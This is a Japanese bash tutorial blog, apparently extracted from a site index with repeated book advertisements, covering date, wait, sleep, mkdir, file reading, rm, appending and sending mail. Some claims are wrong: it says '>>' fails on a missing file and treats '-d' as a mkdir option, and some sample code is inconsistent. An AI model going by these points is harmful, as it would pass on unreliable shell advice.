本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/","title":"【２７．mailコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"dateコマンド 現在の日付を解析する：\ndateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。\u0026lsquo;date_parse.sh\u0026rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。\n#!/bin/bash Year=`date +%Y`; Month=`date +%m`; Day=`date +%d`; Hour=`date +%H`; Minute=`date +%M`; Second=`date +%S`; echo `date`; echo \u0026#34;Current Date is: $Day-$Month-$Year\u0026#34;; echo \u0026#34;Current Time is: $Hour:$Minute:$Second\u0026#34;; bashコマンドでファイルを実行します。\n$ bash date_parse.sh 2022年 1月13日 木曜日 12時19分06秒 JST Current Date is: 13-01-2022 Current Time is: 12:19:06 $ ヒント dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。 $ date \u0026#39;+%Y/%m/%d\u0026#39; 2005/09/11 $ date \u0026#39;+%Y/%m/%d(%a)\u0026#39; 2005/09/11(Sun) $ date \u0026#39;+%y/%m/%d\u0026#39; 05/09/11 $ date \u0026#39;+%F\u0026#39; 2005-09-11 $ date \u0026#39;+%D\u0026#39; 09/11/05 $ date \u0026#39;+%R\u0026#39; 01:18 $ date \u0026#39;+%T\u0026#39; 01:18:01 $ date \u0026#39;+%r\u0026#39; 01:18:06 AM $ date \u0026#39;+%Y/%m/%d%n%r\u0026#39; 2005/09/11 01:18:27 AM #↑%n を使用することで、出力に改行を含めることができる。 # 1日後 $ date -d \u0026#39;1 day\u0026#39; # 2日後 $ date -d \u0026#39;2 days # 1日前 $ date -d \u0026#39;1 day ago\u0026#39; # 1ヶ月前 $ date -d \u0026#39;1 month ago\u0026#39; # 1年前 $ date -d \u0026#39;1 year ago\u0026#39; # 1時間前 $ date -d \u0026#39;1 hour ago\u0026#39; # 1分前 $ date -d \u0026#39;1 minute ago\u0026#39; # 1秒前 $ date -d \u0026#39;1 second ago\u0026#39; $ IFSBK=${IFS} ; IFS=$\u0026#39;\\n\u0026#39; ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +\u0026#34;%s\u0026#34;) - 300 )) -lt $(echo ${record} | cut -d\u0026#34; \u0026#34; -f 1,2,3 | date --date=\u0026#34;$(cat -)\u0026#34; +\u0026#34;%s\u0026#34;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK} 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/","title":"【２８．dateコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"waitコマンド waitコマンド：\nwaitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。\u0026rsquo; wait_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;Wait command\u0026#34; \u0026amp; process_id=$! wait $process_id echo \u0026#34;Exited with status $?\u0026#34; bashコマンドでファイルを実行します。\n$ bash wait_example.sh Wait command Exited with status 0 $ わかりにくいですね。\nもう少しわかりやすく説明します。\nwaitコマンドは、他のプロセスの終了まで待機することができるコマンドです。\n例えば、以下三つのファイルを実行します。\n末尾に \u0026amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; echo \u0026#34;終了しました\u0026#34;; 上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; wait; echo \u0026#34;終了しました\u0026#34;; 上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。\n前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。\n#!/bin/bash command1 \u0026amp; command2 \u0026amp; wait command3 上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。\nヒント waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/","title":"【２９．waitコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"sleepコマンド sleepコマンド：\nコマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。\u0026lsquo;sleep_example.sh\u0026rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。\n#!/bin/bash echo “Wait for 5 seconds” sleep 5 echo “Completed” bashコマンドでファイルを実行します。\n$ bash sleep_example.sh “Wait for 5 seconds” “Completed” $ わかりにくいですね。\n少し高度だけど、わかりやすいサンプルも書いておきます。\nwait コマンドのサンプル sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は $! で取得できます。\n#!/bin/bash for((i=0;i\u0026lt;3;i++));do sleep 5 \u0026amp;; array[i]=$!; echo \u0026#34;Sleeping: ${i} : ${array[i]}\u0026#34;; done wait ${array[@]}; echo \u0026#34;Finish!!\u0026#34;; ヒント 二つのコマンドの違いは以下の通りです。 sleepは指定した時間だけ処理を遅延 waitはプロセスやジョブの終了を待つ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/","title":"【３０．sleepコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\n関数からの戻り値の受け渡し 関数からの戻り値の受け渡し：\nBash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。\u0026lsquo;function_return.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。\n#!/bin/bash function greeting(){ str=\u0026#34;こんにちは、$name\u0026#34;; echo \u0026#34;$str\u0026#34;; } echo \u0026#34;あなたの名前を入力して下さい\u0026#34;; read name; val=$(greeting); echo \u0026#34;関数からの戻り値は「${val}」です。\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_return.sh あなたの名前を入力して下さい suzuki 関数からの戻り値は「こんにちは、suzuki」です。 $ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 ディレクトリを作成する ディレクトリを作成する：\nBashは「mkdir」コマンドを使用して新しいディレクトリを作成します。\u0026lsquo;make_directory.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34; read newdir `mkdir \u0026#34;$newdir\u0026#34;` bashコマンドでファイルを実行します。\n$ bash make_directory.sh ディレクトリ名を入力して下さい。 suzuki $ ls suzuki/ ヒント よく記述していたのは以下のようなコードでした。 事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。 #!/bin/bash if [ -d \u0026#34;/tmp/of/work\u0026#34; ];then : # 何もしない else mkdir -p \u0026#34;/tmp/work\u0026#34;; fi cd \u0026#34;/tmp/of/work\u0026#34;; 存在を確認してディレクトリを作成する 存在を確認してディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの\u0026rsquo; -d \u0026lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。\u0026lsquo;directory_exist.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34;; read ndir; if [ -d \u0026#34;$ndir\u0026#34; ];then echo \u0026#34;ディレクトリが存在します。\u0026#34;; else `mkdir $ndir`; echo \u0026#34;ディレクトリを作成しました。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリを作成しました。 $ ls suzuki/ $ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリが存在します。 $ ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash mkdir_example2.sh drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 $ ファイルを読む ファイルを読む：\nwhileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。\u0026lsquo;read_file.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する\u0026rsquo;book.txt\u0026rsquo;の内容を読み取ります。\n「book.txt」ファイルを作成します。\n$ vim book.txt ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 #!/bin/bash file=\u0026#39;book.txt\u0026#39;; if [ -f \u0026#34;$file\u0026#34; ];then while read line;do echo \u0026#34;$line\u0026#34;; done\u0026lt;$file else echo \u0026#34;$file ファイルがありません\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash read_file.sh ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。\ni-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k cat します。\n$ cat instance-tag.list i-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k $ 以下のソースファイルを作成します。\n#!/bin/bash # catしてwhile read で1行ずつ読み込む # 「cat instance-tag.list」の結果を1行ずつ「line」 # という変数に代入しています。 cat instance-tag.list | while read line;do # 二つの変数に値切り出して代入 # $()は()内で指定したコマンドの実行結果を返します。 # 今回の場合、「echo $line | cut -d, -f 1」の実行結果が # 「instance_id」に定義されます。 instance_id=$(echo $line | cut -d, -f 1) tag_value=$(echo $line | cut -d, -f 2) # 表示 echo \u0026#34;instance_id: ${instance_id}\u0026#34;; echo \u0026#34;tag_value: ${tag_value}\u0026#34;; done bashコマンドでファイルを実行します。\n$ bash whileread_example2.sh instance_id: i-0f6126b7aeedfabd6 tag_value: hoge instance_id: i-050536efdd9dc1126 tag_value: fuga instance_id: i-0869f24358fb3f698 tag_value: f8k $ ヒント cutコマンドの部分は、awkコマンドを使うこともあります。 今回は、cutの方が処理速度が速いため、cutコマンドを使いました。 ちなみにawkの場合は、以下のように記述します。\ninstance_id=$(echo $line | awk -F, \u0026#39;{print $1;}\u0026#39;); tag_value=$(echo $line | awk -F, \u0026#39;{print $2;}\u0026#39;); ファイルを削除する ファイルを削除します：\n\u0026lsquo;rm\u0026rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。\n#!/bin/bash echo \u0026#34;削除するファイルまたはディレクトリ名を入力して下さい。\u0026#34; read fn rm -i $fn bashコマンドでファイルを実行します。\n$ ls suzuki/ book.txt bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 suzuki rm: suzuki: is a directory bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 book.txt $ ls suzuki/ $ ヒント 基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。 rm\n-f :確認をせずに削除 -r ：再帰的に削除 フォルダを削除\nrm -rf 高度なヒント シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。 この場合は、 /bin/cp\nまたは\n/bin/rm を使うと、確認なしで実行することができます。\nファイルに追加 ファイルに追加：\nbashで「\u0026raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。\u0026lsquo;append_file.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。\n1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter #!/bin/bash echo \u0026#34;追加する前のファイル\u0026#34;; cat book.txt; echo \u0026#34;5. Bash Programming\u0026#34; \u0026gt;\u0026gt; book.txt echo \u0026#34;追加した後のファイル\u0026#34; cat book.txt; bashコマンドでファイルを実行します。\n$ bash append_file.sh 追加する前のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 追加した後のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 5. Bash Programming $ ヒント 「\u0026gt;」はファイルを新しく作成して追記します。 「\u0026raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「\u0026raquo;」を行うと、ついするファイルがないため、エラーとなります。 ファイルの存在を確認するための方法を次の章で説明します。 ファイルが存在するかどうかを確認 ファイルが存在するかどうかをテストします。\n\u0026lsquo;-e\u0026rsquo;または\u0026rsquo;-f\u0026rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの \u0026lsquo;if [ ]\u0026lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。\u0026rsquo; file_exist.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。\n#!/bin/bash filename=$1; if [ -f \u0026#34;$filename\u0026#34; ];then echo \u0026#34;ファイルが存在します。\u0026#34;; else echo \u0026#34;ファイルは存在しません。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ ls book.txt level.txt bash file_exist.sh level2.txt ファイルは存在しません。 bash file_exist.sh level.txt ファイルが存在します。 ヒント 「\u0026raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。 ファイルが存在していればアペンド（追記）する。 ファイルが存在しなければファイルを作成して追記する。 といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。 #!/bin/bash if [ -f level.txt ]; then # ファイルが存在するならば追記する echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; else # ファイルが存在しないからlevel.txtを作成してから追記 :\u0026gt; level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; fi echo \u0026#34;追加した後のファイル\u0026#34; cat level.txt; ヒント touch コマンドと :\u0026gt; の違いを明確にしておく必要があります。 「:\u0026gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。 「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。 この違いを利用するとif文はとても簡潔に書き換えることができます。 touchコマンドを使って上記ソースを書き換えてみます。 #!/bin/bash :\u0026gt; level.txt # 新規にファイルを作成 echo \u0026#34;Shell Scripting\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;1回目に追加したファイル\u0026#34; cat level.txt; # 既にファイルが存在するので何もしない # 万が一、ファイルが存在しなければ作成。 touch level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;2回目に追加したファイル\u0026#34; cat level.txt; $ bash bash_append_file3.sh 1回目に追加したファイル Shell Scripting 2回目に追加したファイル Shell Scripting Bash Programming $ mailコマンド メールを送る：\n\u0026rsquo; mail \u0026lsquo;または \u0026rsquo; sendmail \u0026lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。\u0026rsquo; mail_example.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。\nmailコマンドインストール\nまずはここを参考に\nMacでコマンドからメールを送る Gmail\nlinuxの場合は\n$ yum install mailx 実際にメールを送ってみます。\n$ echo \u0026#34;本文\u0026#34; | mail -s \u0026#34;タイトル\u0026#34; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com 恐ろしいほどに簡単ですね。\nおかしな事をかんがえるのはやめましょう。\nシェルスクリプトでサンプルを作る\nadmin@sample.com の部分を自分のメールアドレスに置き換えて実行して下さい。\n#!/bin/bash Recipient=\u0026#34;admin@sample.com\u0026#34; Subject=\u0026#34;Greeting” Message=\u0026#34;Welcome to our site\u0026#34; `mail -s $Subject $Recipient \u0026lt;\u0026lt;\u0026lt; $Message` bashコマンドでファイルを実行します。\n$ bash mail_example.sh $ ヒント くれぐれもおかしな事をかんがえるのはやめましょう。 dateコマンド 